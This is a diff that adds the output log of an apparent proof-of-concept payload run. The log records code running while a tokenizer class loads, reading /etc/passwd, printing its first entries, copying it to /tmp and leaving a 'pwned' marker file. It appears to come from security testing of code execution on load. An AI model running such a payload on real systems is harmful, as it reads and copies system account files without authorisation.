@@ -1,0 +1,21 @@
+[*] Payload executing - system reconnaissance mode
+[+] Proof marker created: /tmp/exo_pwned_marker.txt
+[+] Successfully read /etc/passwd (1683 bytes)
+[+] First entries:
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+[+] Wrote /etc/passwd to: /tmp/exo_passwd_dump.txt
+[✓] Verified: /tmp/exo_passwd_dump.txt contains 1683 bytes
+[-] System info gathering failed: 'posix.uname_result' object has no attribute 'processor'
+[+] TikTokenTokenizer class loaded and ready
+[✓] Payload execution complete
+
+=== files written ===
+  [exists] /tmp/exo_pwned_marker.txt
+  [exists] /tmp/exo_passwd_dump.txt
+  [missing] /tmp/passwd_leaked.txt
+  [missing] /home/anonymous/repos/test-bed/datasets/applexml-tokenization-kimi/fake_home/exo_passwd.txt
+  [missing] /tmp/exo_sysinfo.txt
